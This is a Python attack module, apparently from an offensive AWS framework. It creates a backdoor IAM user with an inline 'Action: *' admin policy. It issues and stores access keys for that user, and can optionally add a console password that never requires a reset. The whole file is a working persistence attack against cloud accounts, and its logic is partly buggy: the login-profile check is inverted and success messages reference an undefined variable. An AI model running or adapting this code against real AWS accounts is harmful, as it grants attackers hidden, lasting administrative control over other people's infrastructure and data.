import random, string

import flask_mongoengine
from termcolor import colored
from datetime import datetime
import json
from pydoc import pipepager

from core.database.models import AWSCredentials

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "iam",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "USERNAME": {
        "value": "",
        "required": "false",
        "description": "The user to allow access to the Management Console. Either use this ot"
    },
    "CREATE-LOGIN-PROFILE": {
        "value": "false",
        "required": "false",
        "description": "If this option is put to true, the module will create a login profile to allow access to the Management Console."
    },
    "POLICY-TO-ATTACH": {
        "value": '{"Version": "2012-10-17", "Statement": [{"Sid": "VisualEditor0", "Effect": "Allow", "Action": "*", "Resource": "*"}]}',
        "required": "true",
        "description": "The inline policy to add to the user"
    }
}
description = "This module will create an IAM user, Attach inline admin policy, Access Key and Login Profile if asked."

aws_command = ""

def exploit(profile, workspace):
    user = variables['USERNAME']['value']
    createLP = variables['CREATE-LOGIN-PROFILE']['value']
    policyDoc = variables['POLICY-TO-ATTACH']['value']


    if createLP.lower() != "true" and createLP.lower() != "false":
        return {"error": f"Please only put true or false on CREATE-LOGIN-PROFILE"}

    if user == "":
        user = "admin-user-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))

    return_data = {
        "User": user
    }

    try:
        profile.create_user(
            UserName=user
        )
        return_data['UserStatus'] = f"User {user} Created"
    except Exception as e:
        return {"error": f"Error creating the user: {str(e)}"}

    try:
        response = profile.create_access_key(
            UserName=user
        )

        json_data = {
            "aws_profile_name": f"{response['AccessKey']['UserName']}-{''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(5))}",
            "aws_access_key": response['AccessKey']['AccessKeyId'],
            "aws_secret_key": response['AccessKey']['SecretAccessKey'],
            "aws_region": profile.meta.region_name
        }

        try:
            awscredentials = AWSCredentials.objects.get(aws_access_key=json_data['aws_access_key'])
            awscredentials.delete()
            awscredentials.save(**json_data)
            return_data['ProfileSaved'] = f"Saved profile to Database: {str(e)}"

        except flask_mongoengine.DoesNotExist:
            AWSCredentials(**json_data).save()
            return_data['ProfileSaved'] = f"Saved profile to Database: {str(e)}"

        except Exception as e:
            return_data['ProfileSaved'] = f"Error saving profile to Database: {str(e)}"

        return_data['AccessKeyStatus'] = f"Credentials {response['AccessKey']['AccessKeyId']}:{response['AccessKey']['SecretAccessKey']} Created"
    except Exception as e:
        return_data['AccessKeyStatus'] = f"Error creating credentials for user: {str(e)}"

    if createLP.lower() != "true":
        try:
            password = ''.join([random.choice(string.ascii_letters + string.digits + string.punctuation) for n in range(12)])
            profile.create_login_profile(
                UserName=user,
                Password=password,
                PasswordResetRequired=False
            )
            return_data['LoginProfileStatus'] = f"Created Login profile with password {password}"
        except Exception as e:
            return_data['Login Profile'] = f"Error creating login profile for user: {str(e)}"

    try:
        profile.put_user_policy(
            UserName=user,
            PolicyName="AdminPolicy",
            PolicyDocument=policyDoc
        )
        return_data[
            'AdminPolicyStatus'] = f"AdminPolicy was added to the user"
    except Exception as e:
        return_data['AccessKeyStatus'] = f"Error adding admin policy to user: {str(e)}"

    return return_data